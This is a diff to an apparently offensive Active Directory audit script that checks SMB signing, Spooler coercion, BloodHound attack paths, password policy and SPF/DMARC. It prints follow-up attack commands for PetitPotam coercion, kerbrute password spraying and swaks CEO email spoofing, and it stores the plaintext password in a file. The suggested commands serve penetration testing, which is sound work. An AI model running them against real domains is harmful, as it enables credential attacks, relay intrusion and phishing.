@@ -90,7 +90,6 @@ CURRENT_PATH=$(pwd)
 OUTPUT_DIR="$CURRENT_PATH/fkad_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"
 mkdir -p "$OUTPUT_DIR"
 
-echo ""
 echo -e "${BLUE}[*] DC FQDN   : ${DC_FQDN}${NC}"
 echo -e "${BLUE}[*] DC IP     : $DC_IP${NC}"
 echo -e "${BLUE}[*] Domain    : $DOMAIN${NC}"
@@ -191,7 +190,6 @@ else
   echo -e "${GREEN}[OK] All hosts in ${SUBNET}.0/24 have SMB Signing${NC}"
   rm -f "$OUTPUT_DIR/relay_targets.txt"
 fi
-echo -e "${GREY}       nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --gen-relay-list '$OUTPUT_DIR/relay_targets.txt'${NC}"
 
 # LAPS Check
 LAPS_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
@@ -262,7 +260,7 @@ if echo "$SPOOLER_CHECK" | grep -qi "Spooler.*enabled\|TRUE"; then
   else
     echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets (DCs only)${NC}"
   fi
-  echo -e "${GREY}       petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+  echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
 elif echo "$SPOOLER_CHECK" | grep -qi "STATUS_PIPE_NOT_AVAILABLE"; then
   echo -e "${GREEN}[OK] Print Spooler disabled on DC${NC}"
 else
@@ -310,15 +308,15 @@ else
   echo -e "${GREEN}[OK] No users with descriptions found${NC}"
 fi
 
-# Bloodhound Export
 if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
   BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
+  cd "$OUTPUT_DIR"
   $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c All &>/dev/null
-
+  cd "$CURRENT_PATH"
+  
   # Check for BloodHound JSONs
-  BH_JSON=$(ls -1 ${CURRENT_PATH}/*.json 2>/dev/null | wc -l)
+  BH_JSON=$(ls -1 "$OUTPUT_DIR"/*.json 2>/dev/null | grep -v Certipy | wc -l)
   if [ "$BH_JSON" -gt 0 ]; then
-    mv ${CURRENT_PATH}/*.json "$OUTPUT_DIR/" 2>/dev/null
     echo "$USERNAME:password:$PASSWORD" > "$OUTPUT_DIR/owned"
         echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
 
@@ -350,7 +348,7 @@ if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/n
       cd "$OUTPUT_DIR"
       JSON_FILES=( *.json )
       if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
-        GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo *.json 2>&1)
+        GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo $(ls *.json | grep -v Certipy) 2>&1)
         if echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
           echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
         elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
@@ -405,11 +403,13 @@ fi
 
 # Password policy
 POL_OUT=$(nxc smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" --pass-pol 2>/dev/null)
+MIN_PW_LENGTH=$(echo "$POL_OUT" | grep -i 'Minimum password length' | awk -F: '{print $2}' | tr -d ' ')
+LOCKOUT_THRESHOLD=$(echo "$POL_OUT" | grep -i 'Account Lockout Threshold' | awk -F: '{print $2}' | tr -d ' ')
+LOCKOUT_WINDOW=$(echo "$POL_OUT" | grep -i 'Reset Account Lockout Counter' | awk -F: '{print $2}' | tr -d ' ')
 
-MIN_PW_LENGTH=$(echo "$POL_OUT" | grep -i 'Minimum password length' | awk -F: '{print $2}' | tr -d ' ' )
-LOCKOUT_THRESHOLD=$(echo "$POL_OUT" | grep -i 'Account Lockout Threshold' | awk -F: '{print $2}' | tr -d ' ' )
 [ -z "$MIN_PW_LENGTH" ] && MIN_PW_LENGTH="unknown"
 [ -z "$LOCKOUT_THRESHOLD" ] && LOCKOUT_THRESHOLD="unknown"
+[ -z "$LOCKOUT_WINDOW" ] && LOCKOUT_WINDOW="unknown"
 
 if [ "$MIN_PW_LENGTH" = "unknown" ]; then
   echo -e "${GREY}[--] Minimum password length: unknown${NC}"
@@ -425,12 +425,12 @@ if [ "$LOCKOUT_THRESHOLD" = "unknown" ]; then
   echo -e "${GREY}[--] Account Lockout Threshold: unknown${NC}"
 else
   if [ "$LOCKOUT_THRESHOLD" -ge 5 ] 2>/dev/null; then
-    echo -e "${GREEN}[OK] Account Lockout Threshold: $LOCKOUT_THRESHOLD (>=5)${NC}"
+    echo -e "${GREEN}[OK] Account Lockout Threshold: $LOCKOUT_THRESHOLD (Window: $LOCKOUT_WINDOW)${NC}"
   else
     echo -e "${RED}[KO] Account Lockout Threshold: $LOCKOUT_THRESHOLD (<5)${NC}"
   fi
 fi
-echo -e "${GREY}[--] kerbrute passwordspray -d ${DOMAIN} '${OUTPUT_DIR}/domain_users.txt' --user-as-pass${NC}"
+echo -e "${GREY}       └─ kerbrute passwordspray -d ${DOMAIN} '${OUTPUT_DIR}/domain_users.txt' --user-as-pass${NC}"
 
 echo ""
 
@@ -586,10 +586,10 @@ MX_SERVER=$(dig mx $DOMAIN +short 2>/dev/null | sort -n | head -1 | awk '{print 
 
 if [ -z "$SPF_CHECK" ] && [ -z "$DMARC_CHECK" ]; then
   echo -e "${RED}[KO] No SPF + No DMARC (Email Spoofing possible)${NC}"
-  echo -e "${GREY}       swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
+  echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
 elif [ -z "$SPF_CHECK" ]; then
   echo -e "${RED}[KO] No SPF record (Email Spoofing possible)${NC}"
-  echo -e "${GREY}       swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
+  echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
 elif [ -z "$DMARC_CHECK" ]; then
   echo -e "${RED}[KO] No DMARC record (SPF without enforcement, no spoofing possible)${NC}"
 else
